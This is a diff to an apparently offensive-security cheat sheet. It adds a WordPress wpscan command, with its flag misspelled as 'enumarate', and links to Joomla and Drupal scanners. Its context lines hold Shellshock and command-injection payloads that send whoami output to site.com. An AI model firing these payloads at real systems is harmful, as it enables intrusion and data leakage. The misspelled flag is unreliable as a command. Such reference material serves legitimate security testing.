@@ -855,6 +855,28 @@ curl http://\`whoami\`.site.com/
 
 User-Agent: () { :; }; /usr/bin/nslookup $(whoami).site.com
 
+### CMS
+
+#### Wordpress
+
+-> Tool
+
+wpscan --url http://site.com/wordpress --api-token your_token --enumarate vp --plugins-detection aggressive
+
+https://wpscan.com/wordpress-security-scanner
+
+#### Joomla!
+
+-> Tool
+
+https://github.com/oppsec/juumla
+
+#### Drupal
+
+-> Tool
+
+https://github.com/SamJoan/droopescan
+
 ## Others tool's and things
   
 ### ImageTragik
